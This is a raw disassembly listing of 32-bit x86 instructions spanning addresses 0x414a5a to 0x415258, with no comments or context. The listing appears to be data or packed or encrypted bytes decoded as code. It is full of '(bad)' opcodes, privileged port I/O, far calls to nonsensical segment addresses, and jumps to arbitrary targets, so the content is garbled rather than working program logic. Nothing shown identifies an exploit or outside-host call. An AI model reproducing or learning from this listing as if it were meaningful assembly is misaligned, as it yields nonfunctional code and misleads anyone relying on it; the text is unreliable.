  414a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a5b:	mov    ch,0xaf
  414a5d:	aaa    
  414a5e:	adc    al,0x33
  414a60:	mov    cl,0x6e
  414a62:	sbb    al,0xf
  414a64:	jge    0x4149ee
  414a66:	mov    bh,0xd1
  414a68:	imul   ebp,DWORD PTR [ecx],0xe0124c27
  414a6e:	aam    0xba
  414a70:	rcr    BYTE PTR [ebp-0x35535596],0x32
  414a77:	mov    bh,0xa4
  414a79:	nop
  414a7a:	retf   
  414a7b:	call   0x96e:0x267d695c
  414a82:	loop   0x414a97
  414a84:	pop    ebx
  414a85:	enter  0x4081,0xca
  414a89:	or     dh,BYTE PTR [edi+0x46f9e63b]
  414a8f:	enter  0xc1cc,0x6
  414a93:	and    BYTE PTR [ecx-0x4e],al
  414a96:	idiv   al
  414a98:	add    BYTE PTR [eax-0x2ccf09aa],bl
  414a9e:	xchg   ebx,eax
  414a9f:	jp     0x414b20
  414aa1:	mov    ebp,DWORD PTR [esi]
  414aa3:	mov    ebx,0x8eddb22
  414aa8:	jmp    DWORD PTR [esi+0x2756507b]
  414aae:	mov    esi,0x2ae1d1c4
  414ab3:	jae    0x414b1b
  414ab5:	ret    0x67f8
  414ab8:	cli    
  414ab9:	in     al,dx
  414aba:	and    DWORD PTR [ebx-0x14],ebx
  414abd:	ins    BYTE PTR es:[edi],dx
  414abe:	pop    eax
  414abf:	out    0x6b,al
  414ac1:	outs   dx,BYTE PTR ds:[esi]
  414ac2:	xchg   ecx,eax
  414ac3:	dec    esp
  414ac4:	(bad)  
  414ac5:	jne    0x414a5c
  414ac7:	or     al,0xb3
  414ac9:	adc    cl,cl
  414acb:	mov    ebx,0xaacdd694
  414ad0:	(bad)  
  414ad1:	(bad)  
  414ad2:	mov    ch,0x1c
  414ad4:	fwait
  414ad5:	push   0x6b
  414ad7:	mov    ebx,0xaf802b5
  414adc:	lds    edx,FWORD PTR [eax+0x4c423e49]
  414ae2:	adc    BYTE PTR [eax+0x2a],bh
  414ae5:	fndisi(8087 only) 
  414ae7:	mov    ebx,0xd11b4e38
  414aec:	(bad)  
  414aed:	out    dx,al
  414aee:	inc    edx
  414aef:	mov    al,ds:0x703087ed
  414af4:	out    dx,eax
  414af5:	out    0xea,eax
  414af7:	in     al,dx
  414af8:	dec    ecx
  414af9:	sub    BYTE PTR [eiz*2-0x1dc06dc1],ch
  414b00:	push   0x93074e3a
  414b05:	mov    ah,0xf0
  414b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b08:	dec    eax
  414b09:	pop    ds
  414b0a:	jge    0x414b5f
  414b0c:	mov    al,ds:0xcb4abef5
  414b11:	push   0xffffffb5
  414b13:	scas   al,BYTE PTR es:[edi]
  414b14:	and    ebp,ebp
  414b16:	pop    edi
  414b17:	not    BYTE PTR [ecx-0x743eadcd]
  414b1d:	in     al,dx
  414b1e:	sub    DWORD PTR [esi-0x15c1da28],0xffffff9b
  414b25:	or     al,0x19
  414b27:	cmp    al,0xb7
  414b29:	mov    ch,0x51
  414b2b:	mov    ss,WORD PTR [esi]
  414b2d:	cmp    BYTE PTR [edx+0x19],bh
  414b30:	ja     0x414b5d
  414b32:	adc    eax,0x0
  414b35:	xchg   ch,dh
  414b37:	cld    
  414b38:	nop    DWORD PTR ds:0x1b4f1427
  414b40:	mov    edi,DWORD PTR [ecx+0x1f]
  414b43:	call   0x6f0a:0xc7a6db1b
  414b4a:	ss add eax,0x24885bbc
  414b50:	push   eax
  414b51:	out    dx,eax
  414b52:	inc    eax
  414b53:	jb     0x414bc3
  414b55:	nop
  414b56:	mov    ds:0xe291f3b4,al
  414b5b:	mov    dh,0x96
  414b5d:	out    0x9d,al
  414b5f:	popa   
  414b60:	fnstcw WORD PTR [esi+0xb]
  414b63:	js     0x414bcb
  414b65:	fcmove st,st(2)
  414b67:	and    eax,0xa7d283b9
  414b6c:	jecxz  0x414b57
  414b6e:	jmp    0x97678016
  414b73:	xchg   ebp,eax
  414b74:	add    eax,0xd536e288
  414b79:	leave  
  414b7a:	jg     0x414b8b
  414b7c:	arpl   WORD PTR [edx+0x1f],cx
  414b7f:	fisttp WORD PTR [esi-0x4a]
  414b82:	popf   
  414b83:	mov    bh,0x1
  414b85:	lods   al,BYTE PTR ds:[esi]
  414b86:	test   ch,dh
  414b88:	ficomp DWORD PTR [edx+0xc045e01]
  414b8e:	mov    al,ds:0x70b0c117
  414b93:	in     al,dx
  414b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b95:	inc    ecx
  414b96:	jbe    0x414bb1
  414b98:	and    eax,0x72f276f1
  414b9d:	test   ebx,0x4cbe2c6a
  414ba3:	mov    dl,0x8b
  414ba5:	imul   BYTE PTR [eax+0x1770cb9a]
  414bab:	and    eax,0xec7a4228
  414bb0:	ds (bad) 
  414bb2:	xchg   DWORD PTR [ebx+0x13],ebp
  414bb5:	pop    ecx
  414bb6:	cli    
  414bb7:	mov    al,ds:0xd689abe5
  414bbc:	hlt    
  414bbd:	mov    dl,dl
  414bbf:	or     bl,BYTE PTR [esp+eiz*2]
  414bc2:	sti    
  414bc3:	jle    0x414b8e
  414bc5:	retf   0x478a
  414bc8:	(bad)  
  414bc9:	fmul   st,st(4)
  414bcb:	ins    DWORD PTR es:[edi],dx
  414bcc:	cmovo  ebp,DWORD PTR es:[ebp-0x3ceb1e2f]
  414bd4:	add    BYTE PTR [esi-0x5343501e],0x76
  414bdb:	add    BYTE PTR [ecx],bh
  414bdd:	xchg   edx,eax
  414bde:	idiv   BYTE PTR [esi+0x978b110]
  414be4:	adc    BYTE PTR [edx],al
  414be6:	cmc    
  414be7:	test   al,0x2
  414be9:	mov    dl,0x91
  414beb:	sbb    esi,esi
  414bed:	sub    ecx,edi
  414bef:	sbb    al,0xb8
  414bf1:	jnp    0x414bd1
  414bf3:	mov    esi,0xca4ee738
  414bf8:	mov    al,ds:0xfe353994
  414bfd:	arpl   WORD PTR [edi],ax
  414bff:	or     eax,0x48f5ba9b
  414c04:	ds mov dl,dl
  414c07:	mov    al,0xf1
  414c09:	fcomip st,st(6)
  414c0b:	xlat   BYTE PTR ss:[ebx]
  414c0d:	mov    BYTE PTR [eax-0x58151915],dh
  414c13:	fs inc edx
  414c15:	dec    edi
  414c16:	cmc    
  414c17:	cdq    
  414c18:	(bad)  
  414c19:	jbe    0x414c34
  414c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c1c:	nop
  414c1d:	add    al,0x62
  414c1f:	jb     0x414bd1
  414c21:	and    eax,0x4beaa0d4
  414c26:	call   0xd7cf:0x36269763
  414c2d:	cmp    dl,BYTE PTR [eax+edx*1]
  414c30:	mov    es:0xcf085f29,al
  414c36:	lock jmp 0x4e52:0xa1b7bea5
  414c3e:	push   0x8df05bd2
  414c43:	test   al,0x26
  414c45:	ins    BYTE PTR es:[edi],dx
  414c46:	mov    edi,0x5e367581
  414c4b:	jg     0x414c7b
  414c4d:	push   eax
  414c4e:	dec    esp
  414c4f:	mov    ah,0x72
  414c51:	push   0x8b529902
  414c56:	mov    cs,WORD PTR [ebx+0x5fd958a5]
  414c5c:	call   0x9aa8:0x4baaa9f6
  414c63:	push   0xffffff9e
  414c65:	sbb    al,BYTE PTR [ebp+0x40]
  414c68:	add    ecx,DWORD PTR [bp+0x7b16]
  414c6d:	mov    ds,edi
  414c6f:	cli    
  414c70:	push   ecx
  414c71:	jecxz  0x414cbb
  414c73:	adc    al,ch
  414c75:	cli    
  414c76:	sbb    eax,DWORD PTR [edi+0x375aa94c]
  414c7c:	add    DWORD PTR [ecx-0x66b82803],ebp
  414c82:	mov    dh,0x95
  414c84:	adc    esi,DWORD PTR [ecx]
  414c86:	nop
  414c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c88:	or     DWORD PTR [esi],ecx
  414c8a:	repnz or eax,edi
  414c8d:	pop    ebp
  414c8e:	mov    eax,0xe4698c19
  414c93:	shl    DWORD PTR ds:[edi+ecx*1-0x18cd1de7],0x73
  414c9c:	or     DWORD PTR [esi-0x1452ceec],eax
  414ca2:	int    0xaf
  414ca4:	push   0xffffffe1
  414ca6:	mov    eax,0x2782300a
  414cab:	call   0xfc3fc9ed
  414cb0:	xor    edx,DWORD PTR [ecx+0x74]
  414cb3:	mov    ds:0x42dc3988,eax
  414cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cb9:	adc    al,0x22
  414cbb:	loop   0x414cac
  414cbd:	out    0xbc,al
  414cbf:	stos   DWORD PTR es:[edi],eax
  414cc0:	jae    0x414c71
  414cc2:	aaa    
  414cc3:	mov    eax,ds:0x1b97872e
  414cc8:	outs   dx,DWORD PTR ds:[esi]
  414cc9:	and    al,dh
  414ccb:	mov    al,0xab
  414ccd:	out    0x1e,al
  414ccf:	push   ebp
  414cd0:	push   eax
  414cd1:	sahf   
  414cd2:	std    
  414cd3:	out    dx,al
  414cd4:	call   0x8f65:0x6d729a6
  414cdb:	jmp    0x414cf1
  414cdd:	sbb    BYTE PTR [eax-0x17],cl
  414ce0:	push   edi
  414ce1:	lds    esi,FWORD PTR [edx-0xa4d2f40]
  414ce7:	adc    DWORD PTR [ecx+edx*2],ebx
  414cea:	mov    dl,ah
  414cec:	stc    
  414ced:	pop    ds
  414cee:	out    0x8f,al
  414cf0:	(bad)  
  414cf1:	sbb    ecx,DWORD PTR [esi-0x380df67b]
  414cf7:	shr    BYTE PTR [eax+0x34cafdcb],1
  414cfd:	or     edx,esi
  414cff:	inc    ecx
  414d00:	sbb    ebx,DWORD PTR [eax-0x1abe926]
  414d06:	aad    0x38
  414d08:	mov    DWORD PTR [ebx-0x20],0xf719e095
  414d0f:	aad    0x7e
  414d11:	adc    ebx,DWORD PTR [ebx+0x3a]
  414d14:	mov    ah,0x7c
  414d16:	xchg   DWORD PTR [edi+edx*4+0x24],eax
  414d1a:	push   0xec4788d3
  414d1f:	pop    ss
  414d20:	fwait
  414d21:	aam    0x1c
  414d23:	paddusw mm3,QWORD PTR [bx+si]
  414d27:	iret   
  414d28:	push   ebp
  414d29:	retf   0x71ce
  414d2c:	ret    
  414d2d:	std    
  414d2e:	ins    BYTE PTR es:[edi],dx
  414d2f:	xor    DWORD PTR [ecx+ebp*4-0x2638d3d],edx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	in     eax,0xae
  414d39:	jl     0x414cd7
  414d3b:	out    0x56,eax
  414d3d:	jg     0x414d2a
  414d3f:	jmp    0x508d:0xc2fcd6d4
  414d46:	or     eax,DWORD PTR [esi*1+0x1ece8e73]
  414d4d:	jmp    0x870fe859
  414d52:	aad    0xd6
  414d54:	cmp    ch,BYTE PTR [ecx-0x2]
  414d57:	push   0xffffffbf
  414d59:	inc    esp
  414d5a:	pop    edi
  414d5b:	mov    esi,0xe3301add
  414d60:	mov    ch,0x29
  414d62:	scas   al,BYTE PTR es:[edi]
  414d63:	push   0xffffff87
  414d65:	sbb    eax,0x6b16a618
  414d6a:	or     dl,BYTE PTR [edx]
  414d6c:	xchg   ebp,eax
  414d6d:	int    0x74
  414d6f:	jle    0x414da4
  414d71:	xor    DWORD PTR [ecx+0x466418f4],ebp
  414d77:	sub    DWORD PTR [edi-0x31eb698a],0xfc7388b6
  414d81:	jl     0x414e01
  414d83:	push   edx
  414d84:	sbb    eax,0x23471b48
  414d89:	test   dh,dh
  414d8b:	ror    DWORD PTR [edi-0x725da44e],1
  414d91:	stos   BYTE PTR es:[edi],al
  414d92:	mov    WORD PTR [ebp-0x17],ss
  414d95:	inc    esp
  414d96:	xchg   ebp,eax
  414d97:	enter  0x3b0,0x87
  414d9b:	and    edx,esp
  414d9d:	loop   0x414d9b
  414d9f:	pop    ebp
  414da0:	adc    edi,DWORD PTR [ebp+0x4]
  414da3:	jb     0x414dbc
  414da5:	int    0x48
  414da7:	mov    al,ds:0xe96dbc4c
  414dac:	jle    0x414d4f
  414dae:	lock sub DWORD PTR [ebp+0x6d],esp
  414db2:	popf   
  414db3:	out    dx,eax
  414db4:	pop    ds
  414db5:	sbb    BYTE PTR [esi+0x38e119f0],bh
  414dbb:	lock in al,0x27
  414dbe:	mov    al,ds:0xdab38ee6
  414dc3:	call   0x9b02630d
  414dc8:	sbb    dl,BYTE PTR [ebx+0x69163635]
  414dce:	std    
  414dcf:	pushf  
  414dd0:	mov    al,cl
  414dd2:	sbb    BYTE PTR [esi-0x66],0x1c
  414dd6:	stos   WORD PTR es:[edi],ax
  414dd8:	jmp    0x414e43
  414dda:	or     bh,bl
  414ddc:	jns    0x414e56
  414dde:	push   edx
  414ddf:	rcr    dh,0x91
  414de2:	adc    BYTE PTR [ecx],bh
  414de4:	mov    esp,0x2dd07a51
  414de9:	add    edi,ecx
  414deb:	adc    DWORD PTR [ebx],0x8e418b4d
  414df1:	enter  0xa062,0x12
  414df5:	sbb    al,0xde
  414df7:	sti    
  414df8:	out    0xc5,al
  414dfa:	mov    al,ds:0xbbb932ea
  414dff:	dec    ecx
  414e00:	(bad)  
  414e01:	retf   
  414e02:	fbstp  TBYTE PTR [esi-0xbdd6e3a]
  414e08:	dec    edi
  414e09:	js     0x414e67
  414e0b:	aam    0x94
  414e0d:	pop    ebx
  414e0e:	adc    cl,BYTE PTR [edi]
  414e10:	outs   dx,DWORD PTR ds:[esi]
  414e11:	mov    ch,0xfd
  414e13:	fcom   DWORD PTR [esi+edx*4+0x37]
  414e17:	jg     0x414dd0
  414e19:	sub    DWORD PTR [eax+0x67],edx
  414e1c:	cli    
  414e1d:	or     edi,edi
  414e1f:	(bad)  
  414e20:	sbb    ecx,DWORD PTR [ecx-0xb]
  414e23:	mov    BYTE PTR [ecx],al
  414e25:	mov    al,0xc8
  414e27:	outs   dx,BYTE PTR ds:[esi]
  414e28:	std    
  414e29:	push   cs
  414e2a:	test   eax,0x78aab642
  414e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e30:	ins    DWORD PTR es:[edi],dx
  414e31:	add    BYTE PTR ds:0x1ad27d01,cl
  414e37:	dec    ebp
  414e38:	fsub   st,st(2)
  414e3a:	pop    ss
  414e3b:	mov    bl,0xb4
  414e3d:	into   
  414e3e:	lea    edi,[esi-0x33fb0106]
  414e44:	cmp    DWORD PTR [edx+0x378601fe],ebp
  414e4a:	adc    esi,ebp
  414e4c:	cdq    
  414e4d:	(bad)  
  414e4e:	inc    edx
  414e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e50:	or     BYTE PTR [edi],dl
  414e52:	pop    ds
  414e53:	icebp  
  414e54:	pop    es
  414e55:	push   esi
  414e56:	aaa    
  414e57:	cmp    BYTE PTR [esi-0x1f],bh
  414e5a:	div    BYTE PTR [edi+0x1b65c53c]
  414e60:	(bad)  
  414e61:	stos   BYTE PTR es:[edi],al
  414e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e63:	dec    edx
  414e64:	pop    ebp
  414e65:	mov    ch,0xc9
  414e67:	test   al,0x69
  414e69:	xor    BYTE PTR [edx-0x484c658c],0xc0
  414e70:	inc    esp
  414e71:	ja     0x414ebd
  414e73:	ja     0x414e0d
  414e75:	pop    eax
  414e76:	call   edi
  414e78:	das    
  414e79:	cmp    DWORD PTR [eax+ebp*1],esp
  414e7c:	pop    ebp
  414e7d:	les    ebx,FWORD PTR [ebp-0x50]
  414e80:	std    
  414e81:	hlt    
  414e82:	das    
  414e83:	in     eax,dx
  414e84:	(bad)  [ebp+0x5b]
  414e87:	dec    esi
  414e88:	cmp    BYTE PTR [edi],dl
  414e8a:	dec    esp
  414e8b:	inc    esp
  414e8c:	jbe    0x414f07
  414e8e:	(bad)  
  414e90:	inc    esi
  414e91:	scas   eax,DWORD PTR es:[edi]
  414e92:	mov    DWORD PTR ds:0xaef1341a,esp
  414e98:	mov    ecx,0x37c35f14
  414e9d:	inc    ecx
  414e9e:	mov    ds:0x8dc339de,eax
  414ea3:	jl     0x414ead
  414ea5:	repz inc edi
  414ea7:	dec    edx
  414ea8:	sub    ecx,ebx
  414eaa:	push   ebx
  414eab:	mov    bl,dh
  414ead:	int    0x56
  414eaf:	lea    ebp,[esi-0x60bbce05]
  414eb5:	jecxz  0x414f1a
  414eb7:	mov    ch,0xec
  414eb9:	mov    ebx,0x57d2cb31
  414ebe:	pavgw  mm1,QWORD PTR [ebp+0x70b950cf]
  414ec5:	xor    esp,DWORD PTR [eax-0x2974b134]
  414ecb:	adc    DWORD PTR [edx],edx
  414ecd:	test   DWORD PTR [ebx+0x6d],0xd1160a1
  414ed4:	xor    DWORD PTR [ebx],ebp
  414ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ed7:	add    DWORD PTR [eax+0x5e2fb51f],esi
  414edd:	or     DWORD PTR [ecx+ebp*8+0x6a6c71d1],ebx
  414ee4:	pop    eax
  414ee5:	mov    ebx,0x24e1f2e6
  414eea:	push   ebp
  414eeb:	pop    edi
  414eec:	xor    edi,DWORD PTR [ebx+0x747ef2c4]
  414ef2:	sar    DWORD PTR [edi],cl
  414ef4:	mov    ch,0x6f
  414ef6:	fld    QWORD PTR [edx-0x39321281]
  414efc:	xor    DWORD PTR [ecx+edx*8-0x7a],ecx
  414f00:	xchg   edi,eax
  414f01:	sti    
  414f02:	gs adc eax,0xdf82464e
  414f08:	or     al,BYTE PTR [eax+0xe]
  414f0b:	out    dx,eax
  414f0c:	popf   
  414f0d:	and    BYTE PTR [di+0x6dfb],ah
  414f12:	pop    edx
  414f13:	std    
  414f14:	mov    esp,DWORD PTR [ebx-0x2]
  414f17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f18:	mov    bl,0x28
  414f1a:	and    DWORD PTR [edx+0x54923529],ebx
  414f20:	lahf   
  414f21:	dec    edx
  414f22:	nop
  414f23:	mov    DWORD PTR [edi+0x72],ecx
  414f26:	mov    ds:0x22d2d2d8,eax
  414f2b:	jb     0x414f0a
  414f2d:	mov    eax,ds:0xc772c08b
  414f32:	pop    es
  414f33:	lods   eax,DWORD PTR ds:[esi]
  414f34:	lock call 0x5190:0x4d14c9a2
  414f3c:	sbb    dh,ch
  414f3e:	xor    esp,ebp
  414f40:	or     al,0x44
  414f42:	xor    dl,BYTE PTR [edi]
  414f44:	push   esi
  414f45:	nop
  414f46:	stos   BYTE PTR es:[edi],al
  414f47:	iretw  
  414f49:	hlt    
  414f4a:	push   es
  414f4b:	push   ecx
  414f4c:	push   esi
  414f4d:	push   esi
  414f4e:	pop    ecx
  414f4f:	add    DWORD PTR [ebp-0x4f062a79],0x30539804
  414f59:	xchg   edx,eax
  414f5a:	rcr    DWORD PTR [eax+ebp*1-0x6f3b2c15],cl
  414f61:	lea    ecx,[ecx+0x2a21d014]
  414f67:	aas    
  414f68:	sub    dl,al
  414f6a:	pop    edi
  414f6b:	ret    0x27e9
  414f6e:	mov    bh,0xf8
  414f70:	and    dh,BYTE PTR [esi+0x36]
  414f73:	cld    
  414f74:	push   ecx
  414f75:	dec    ebp
  414f76:	inc    ebx
  414f77:	xor    bl,al
  414f79:	dec    esp
  414f7a:	xchg   DWORD PTR [edx],esi
  414f7c:	mov    fs,ecx
  414f7e:	dec    ebx
  414f7f:	inc    eax
  414f80:	leave  
  414f81:	sub    esi,eax
  414f83:	inc    esi
  414f84:	cmp    eax,0xbb564c30
  414f89:	test   cl,ch
  414f8b:	cwde   
  414f8c:	jnp    0x414f9f
  414f8e:	mov    ah,0x6d
  414f90:	xor    eax,0xa8cc86b4
  414f95:	add    eax,0x1fd2b1c8
  414f9a:	or     cl,BYTE PTR [ecx+0x26]
  414f9d:	pop    es
  414f9e:	and    eax,0xeb02b22b
  414fa3:	push   0xc22e5cda
  414fa8:	arpl   WORD PTR [edx],ax
  414faa:	push   eax
  414fab:	adc    al,0x15
  414fad:	int3   
  414fae:	sti    
  414faf:	dec    esi
  414fb0:	mov    cl,0xf6
  414fb2:	enter  0xdb3b,0x10
  414fb6:	ret    0x6153
  414fb9:	push   es
  414fba:	fprem  
  414fbc:	and    dl,dh
  414fbe:	xor    DWORD PTR [ebp-0x66d55949],edi
  414fc4:	sub    ch,BYTE PTR [esi-0xb]
  414fc7:	and    esp,DWORD PTR [ecx-0x784f09ff]
  414fcd:	or     BYTE PTR [ebx+0x60a54111],bl
  414fd3:	repnz loopne 0x41500f
  414fd6:	sbb    al,0xc4
  414fd8:	mov    edx,0x15b3995f
  414fdd:	out    0xb6,eax
  414fdf:	push   eax
  414fe0:	lods   al,BYTE PTR ds:[esi]
  414fe1:	iret   
  414fe2:	push   ss
  414fe3:	cs jbe 0x414fed
  414fe6:	aas    
  414fe7:	pushf  
  414fe8:	(bad)  
  414fe9:	mov    ebx,0x40e09862
  414fee:	xlat   BYTE PTR ds:[ebx]
  414fef:	dec    esi
  414ff0:	add    eax,0x79c5d72a
  414ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ff6:	xchg   DWORD PTR [ebp+ebp*8-0x1217b451],ebx
  414ffd:	push   edx
  414ffe:	rcr    bl,cl
  415000:	nop
  415001:	mov    cl,0xb3
  415003:	sub    al,BYTE PTR [ebp+0x7883b2c4]
  415009:	inc    eax
  41500a:	icebp  
  41500b:	sub    al,0xd6
  41500d:	lods   al,BYTE PTR ds:[esi]
  41500e:	shl    BYTE PTR [ebp+0x63],0xc2
  415012:	pop    ecx
  415013:	push   0xe46679d
  415018:	mov    bh,0xf4
  41501a:	sbb    BYTE PTR [ebp-0x55159060],cl
  415020:	fsubr  DWORD PTR ds:0xab188e11
  415026:	jae    0x41505d
  415028:	scas   al,BYTE PTR es:[edi]
  415029:	jl     0x414fb4
  41502b:	inc    esi
  41502c:	lods   al,BYTE PTR ds:[esi]
  41502d:	ins    DWORD PTR es:[edi],dx
  41502e:	pushf  
  41502f:	nop
  415030:	sti    
  415031:	pusha  
  415032:	add    eax,0x2e62f6dc
  415037:	push   es
  415038:	ins    BYTE PTR es:[edi],dx
  415039:	and    eax,0x7fdc26a0
  41503e:	sahf   
  41503f:	mov    edx,ecx
  415041:	neg    BYTE PTR [esi-0x55]
  415044:	jle    0x41500e
  415046:	adc    al,0x20
  415048:	sub    BYTE PTR [eax+0x47f3ec],bl
  41504e:	push   es
  41504f:	mov    eax,ds:0x37d02f3e
  415054:	cmp    DWORD PTR [ecx],esp
  415056:	sub    ebx,DWORD PTR [esi+0x14b0901]
  41505c:	push   ds
  41505d:	icebp  
  41505e:	push   ecx
  41505f:	sub    eax,0x840f42ef
  415064:	inc    ecx
  415065:	pop    edx
  415066:	loopne 0x414fee
  415068:	mov    ch,BYTE PTR [ecx-0xe]
  41506b:	and    al,0x4e
  41506d:	jne    0x414ffc
  41506f:	mov    esi,0x4a89d390
  415074:	ss xor ecx,ebp
  415077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415078:	loope  0x415067
  41507a:	cmp    al,0x60
  41507c:	pop    ebp
  41507d:	inc    ebp
  41507e:	push   ecx
  41507f:	ret    0xeb0c
  415082:	inc    eax
  415083:	cwde   
  415084:	inc    esi
  415085:	pop    ecx
  415086:	jge    0x4150bd
  415088:	xor    DWORD PTR [edi],0xe28207a5
  41508e:	int3   
  41508f:	jp     0x415032
  415091:	aas    
  415092:	inc    edx
  415093:	mov    ebp,0xdca7a84d
  415098:	mov    edx,DWORD PTR [ebp+0x39]
  41509b:	inc    ebx
  41509c:	loopne 0x415055
  41509e:	mov    ecx,edx
  4150a0:	pop    DWORD PTR [edi*8+0x2f773be4]
  4150a7:	inc    ebx
  4150a8:	jmp    0x4150e5
  4150aa:	out    dx,al
  4150ab:	pop    ds
  4150ac:	aas    
  4150ad:	sahf   
  4150ae:	mov    edx,0x70427dff
  4150b3:	add    DWORD PTR [ebx],ecx
  4150b5:	ret    
  4150b6:	lods   eax,DWORD PTR ds:[esi]
  4150b7:	retf   0xe8c3
  4150ba:	iret   
  4150bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150bc:	sti    
  4150bd:	fcmovne st,st(3)
  4150bf:	test   al,0x6e
  4150c1:	sub    DWORD PTR [ebx-0x6c4eda9d],ecx
  4150c7:	jno    0x41510f
  4150c9:	or     ah,BYTE PTR [esi-0x40]
  4150cc:	in     eax,0x7d
  4150ce:	(bad)  
  4150cf:	mov    ds:0xf73ea699,al
  4150d4:	sbb    dl,BYTE PTR [eax+0x2d2d2e91]
  4150da:	cmp    esi,DWORD PTR [ecx+esi*2-0x44d8cb34]
  4150e1:	shr    DWORD PTR [esi],cl
  4150e3:	pop    ss
  4150e4:	or     DWORD PTR [ecx+0x43],eax
  4150e7:	push   eax
  4150e8:	cmp    al,0x9f
  4150ea:	and    eax,0x216ebe2a
  4150ef:	mov    eax,ds:0xd252e00e
  4150f4:	ror    esp,0xae
  4150f7:	xchg   edx,eax
  4150f8:	add    eax,0xb1ffd77e
  4150fd:	jnp    0x415097
  4150ff:	mov    cl,0xdd
  415101:	xor    eax,0xb076167e
  415106:	or     ebp,edx
  415108:	js     0x4150cf
  41510a:	das    
  41510b:	js     0x415124
  41510d:	or     al,0x27
  41510f:	jle    0x4150cc
  415111:	sbb    ecx,esp
  415113:	mov    al,ds:0x388901e8
  415118:	test   DWORD PTR [esi],edx
  41511a:	scas   eax,DWORD PTR es:[edi]
  41511b:	and    esi,DWORD PTR [ebp-0x56]
  41511e:	fwait
  41511f:	push   ecx
  415120:	push   ebx
  415121:	(bad)  
  415122:	(bad)  
  415123:	adc    BYTE PTR [ebx+0x665f4a30],ch
  415129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41512a:	mov    cl,0xf6
  41512c:	mov    esi,0x17c65b22
  415131:	add    bh,BYTE PTR cs:[edx+0x74]
  415135:	inc    ebx
  415136:	or     al,0xe8
  415138:	push   0xe870e62a
  41513d:	dec    DWORD PTR [ebx]
  41513f:	sub    al,0x47
  415141:	push   esp
  415142:	mov    al,0x60
  415144:	xchg   ebx,eax
  415145:	lds    eax,FWORD PTR [bp+di+0x54]
  415149:	and    dl,dl
  41514b:	arpl   WORD PTR [esi-0x5a],dx
  41514e:	sub    DWORD PTR [esi-0x3d],edi
  415151:	inc    edi
  415152:	pushf  
  415153:	pop    esi
  415154:	inc    edi
  415155:	adc    bh,cl
  415157:	int3   
  415158:	dec    edi
  415159:	inc    eax
  41515a:	mov    edx,0x2654eb9c
  41515f:	adc    eax,0x956558ae
  415164:	sbb    DWORD PTR [esi-0x62],ebp
  415167:	mov    dl,0xde
  415169:	mov    edi,0x60933f10
  41516e:	sbb    edi,DWORD PTR [ebx-0x35]
  415171:	outs   dx,DWORD PTR ds:[esi]
  415172:	jbe    0x4151d9
  415174:	lea    ecx,[eax-0x48]
  415177:	(bad)  [eax+0x17]
  41517a:	not    cx
  41517d:	pop    eax
  41517e:	mov    ebx,0xa36fed8b
  415183:	stc    
  415184:	mov    ecx,0xc7a68532
  415189:	sub    eax,esi
  41518b:	mov    ah,0xed
  41518d:	xchg   esp,eax
  41518e:	sub    eax,0xa3ac594a
  415193:	popa   
  415194:	xor    BYTE PTR ds:0x70012bf1,dl
  41519a:	push   cs
  41519b:	xor    edx,DWORD PTR [bp+di+0x25]
  41519f:	jmp    0x4151ae
  4151a1:	push   0xffffffcf
  4151a3:	adc    BYTE PTR [eax-0x6696749c],ah
  4151a9:	add    esi,0xffffffcf
  4151ac:	xor    DWORD PTR [ebx+0x17],esp
  4151af:	add    eax,0xcfc40c5f
  4151b4:	outs   dx,BYTE PTR ds:[esi]
  4151b5:	cmc    
  4151b6:	das    
  4151b7:	imul   ecx,DWORD PTR [edx],0x3c
  4151ba:	push   cs
  4151bb:	or     ch,BYTE PTR [ebp+ebx*4-0x8193a28]
  4151c2:	adc    ebp,DWORD PTR [edi-0x7d]
  4151c5:	das    
  4151c6:	cmp    DWORD PTR [ecx-0x2b],ebx
  4151c9:	loop   0x415204
  4151cb:	adc    ecx,eax
  4151cd:	inc    ecx
  4151ce:	or     DWORD PTR [ecx+0x29],ebx
  4151d1:	push   esi
  4151d2:	fnstsw WORD PTR [ebx+eiz*2-0x203e6fdf]
  4151d9:	push   edx
  4151da:	pop    ebp
  4151db:	clc    
  4151dc:	dec    ebp
  4151dd:	mov    ds:0x824e80dd,eax
  4151e2:	je     0x4151dd
  4151e4:	dec    eax
  4151e5:	cwde   
  4151e6:	and    BYTE PTR [eax+0x2124c392],ch
  4151ec:	das    
  4151ed:	(bad)  
  4151ee:	mov    esp,0x5a83c92d
  4151f3:	jge    0x415200
  4151f5:	jne    0x415194
  4151f7:	mov    eax,0x20948b2d
  4151fc:	push   ebp
  4151fd:	sub    DWORD PTR [eax*4-0x689713c2],0xdbdd54d
  415208:	jae    0x4151fe
  41520a:	mov    esp,0x3dc91bcd
  41520f:	jae    0x415265
  415211:	cli    
  415212:	int3   
  415213:	es mov al,0x1
  415216:	imul   edi,DWORD PTR [edx+0x63e21600],0xffffffb0
  41521d:	sti    
  41521e:	cmp    al,0x14
  415220:	lock jnp 0x415239
  415223:	out    0xe,eax
  415225:	jo     0x4151fd
  415227:	add    BYTE PTR [edi-0x30],dl
  41522a:	xor    eax,0x72ec9147
  41522f:	cmp    bh,BYTE PTR [esi+0x56dc9c57]
  415235:	mov    al,0xc
  415237:	test   DWORD PTR ds:0x171e386a,esp
  41523d:	cmp    ebp,DWORD PTR [eax-0x2]
  415240:	bound  ecx,QWORD PTR [ebx-0x6d9631a4]
  415246:	push   ebx
  415247:	or     DWORD PTR [esi-0x35],edi
  41524a:	fsubr  st,st(4)
  41524c:	fwait
  41524d:	push   DWORD PTR [edx+edx*8-0x6226b68c]
  415254:	mov    dl,0xe1
  415256:	fdiv   DWORD PTR [ecx]
  415258:	push   ds
